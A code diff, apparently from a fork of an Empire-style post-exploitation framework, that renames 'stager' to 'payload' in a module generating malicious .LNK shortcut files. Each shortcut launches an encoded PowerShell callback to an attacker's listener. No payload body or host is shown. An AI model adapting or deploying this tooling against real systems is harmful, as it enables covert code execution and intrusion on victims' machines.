@@ -1,7 +1,7 @@
 from lib.common import helpers
 from lib.common import pylnk
 
-class Stager:
+class payload:
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,7 +10,7 @@ class Stager:
 
             'Author': ['@theguly'],
 
-            'Description': ("Create a .LNK file that launches the invader stager."),
+            'Description': ("Create a .LNK file that launches the invader payload."),
 
             'Background' : False,
 
@@ -34,12 +34,12 @@ class Stager:
             # format:
             #   value_name : {description, required, default_value}
             'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
+                'Description'   :   'Listener to generate payload for.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
+            'payloadRetries' : {
+                'Description'   :   'Times for the payload to retry connecting.',
                 'Required'      :   False,
                 'Value'         :   '0'
             },
@@ -104,7 +104,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+        payloadRetries = self.options['payloadRetries']['Value']
         lnkComment = self.options['LNKComment']['Value']
         powershellPath = self.options['PowershellPath']['Value']
         lnkName = self.options['OutFile']['Value']
@@ -116,7 +116,7 @@ class Stager:
             encode = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries)
         launcher = launcher.replace('powershell.exe ','',1)
 
         if launcher == "":
